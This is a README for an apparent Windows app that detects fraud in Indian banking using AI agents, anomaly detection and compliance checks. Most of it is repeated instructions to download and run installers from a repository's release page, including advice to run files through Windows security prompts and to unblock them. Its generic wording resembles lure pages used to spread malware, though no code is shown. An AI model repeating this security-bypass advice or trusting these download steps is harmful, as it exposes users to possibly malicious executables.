# 🛡️ Autonomous-Fraud-Detection-Response-Network - Real-Time Fraud Defense for Banking

[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/Maltese-stbruno491/Autonomous-Fraud-Detection-Response-Network/releases)

## 📥 Download

Visit this page to download and run the app on Windows:

https://github.com/Maltese-stbruno491/Autonomous-Fraud-Detection-Response-Network/releases

## 🔎 What this app does

Autonomous-Fraud-Detection-Response-Network is a Windows app for spotting suspicious banking activity and helping users respond fast.

It uses five AI agents that each handle a part of the fraud check process:

- **TMA**: Transaction Monitoring Agent
- **PRA**: Pattern Risk Agent
- **RAA**: Response Action Agent
- **ABA**: Alert Broker Agent
- **CLA**: Compliance Layer Agent

The app checks transactions in real time, compares them with known fraud patterns, and helps track actions based on RBI and PMLA rules.

## 🪟 Windows system needs

Use a Windows PC with:

- Windows 10 or Windows 11
- At least 8 GB RAM
- 2 GB free storage
- A stable internet connection
- A modern browser for setup files and release pages

For best results, use a machine with 16 GB RAM if you plan to test larger data sets.

## 🚀 How to download and run

1. Open the release page:
   https://github.com/Maltese-stbruno491/Autonomous-Fraud-Detection-Response-Network/releases

2. Find the latest release at the top of the page.

3. Look for a Windows file in the Assets section. Common file types include:
   - `.exe`
   - `.msi`
   - `.zip`

4. Download the file to your PC.

5. If you downloaded a `.zip` file, right-click it and choose **Extract All**.

6. Open the extracted folder.

7. If you see an `.exe` or `.msi` file, double-click it to start setup.

8. Follow the on-screen steps to install the app.

9. After setup, open the app from the Start menu or desktop shortcut.

10. If Windows shows a security prompt, choose the option to run the file if you trust the source.

## 🧭 First-time setup

After you open the app for the first time:

- Wait for the dashboard to load
- Review the sample fraud alerts
- Check the transaction view
- Open the response panel to see suggested actions
- Open the compliance view to inspect RBI and PMLA checks

The app is built to keep the main steps simple, so you can move through screens without technical knowledge.

## 🧠 How it works

The app uses a set of AI tools to review each transaction:

- **Isolation Forest** helps flag activity that looks unusual
- **ChromaDB** stores known fraud patterns and past cases
- **RAG** helps the app pull related context when it sees a risk
- **Multi-agent flow** splits work across different agents
- **Compliance checks** help the app stay aligned with banking rules

This setup helps the app detect risk, explain why it raised an alert, and suggest a next step.

## 📊 Main features

### 🔔 Fraud detection
The app scans transaction data for signs of fraud, such as:

- Large transfers that do not fit the account history
- Repeated failed attempts
- Fast transfers across many accounts
- Location or timing changes that look unusual
- Suspicious use of account patterns

### 🤖 Agent-based response
Each agent has a clear job:

- One agent watches transaction behavior
- One agent checks fraud patterns
- One agent recommends a response
- One agent sends alerts
- One agent checks compliance rules

### 🗂️ Case memory
The app can keep records of past fraud cases and compare new activity with them. This helps the system learn from earlier events.

### 📜 Compliance support
The app includes checks tied to RBI and PMLA requirements so fraud handling stays aligned with banking process rules.

### 📈 Live dashboard
The dashboard gives you a simple view of:

- Active alerts
- Risk levels
- Recent transactions
- Response status
- Compliance state

## 🧩 What you may see on screen

The app may show:

- A home dashboard
- A transaction list
- A fraud score panel
- An alert log
- A response history view
- A compliance review panel

Each screen keeps the next action clear, so you can review a case without digging through menus.

## 🛠️ Common file types in the release

You may find one of these files in the release assets:

- **Installer file**: use this to install the app
- **Portable file**: open it after download without a full install
- **Zip archive**: extract it first, then run the app file inside

If the release page has more than one Windows file, choose the one that matches your needs.

## 🔐 Safe use on Windows

Before opening the file:

- Confirm that the file came from the release page
- Check the file name and version
- Save the file in a folder you can find again
- Use standard Windows download tools and file explorer steps

If you plan to run the app on a work PC, make sure you have permission from your IT team first.

## 🧪 Typical use cases

This app fits teams that need to:

- Review suspicious banking transactions
- Track fraud alerts in real time
- Compare new cases with past incidents
- Support compliance review work
- Test fraud detection rules in a local Windows setup

## 🧰 Troubleshooting

### The file will not open
- Check that the download finished
- Try downloading it again
- Make sure Windows did not place it in the Downloads folder under a different name

### Windows blocks the file
- Right-click the file
- Open **Properties**
- Check for an **Unblock** option if Windows shows one
- Try again

### The app opens and then closes
- Reboot your PC
- Open the file again
- Make sure your Windows version meets the system needs

### The release page has no Windows file
- Refresh the page
- Open the latest release entry
- Look under **Assets**
- If needed, check older releases for a Windows package

## 📁 Suggested folder setup

For easier use, keep the app files in a simple folder path such as:

- `Downloads`
- `Desktop`
- `Documents\Fraud-Detection-App`

Avoid deep folder paths with many nested folders, since that can make files harder to find later.

## 🧭 File names you may encounter

The release may include names such as:

- `Windows-Installer.exe`
- `Fraud-Detection-App.msi`
- `Autonomous-Fraud-Detection-Response-Network.zip`
- `Release-Windows-x64.exe`

Pick the file meant for Windows desktop use.

## 🔄 Updating the app

When a new release is published:

1. Return to the release page
2. Download the newest Windows file
3. Remove or keep the old version based on your needs
4. Open the new file and follow the same setup steps

## 🧾 About the project

Autonomous-Fraud-Detection-Response-Network is built for fraud review in Indian banking. It combines:

- AI agents for task handling
- Machine learning for anomaly checks
- ChromaDB for case context
- Flask for the backend
- React for the interface
- RBI and PMLA aligned review steps

The goal is to help users spot risk fast and move through response steps with less manual work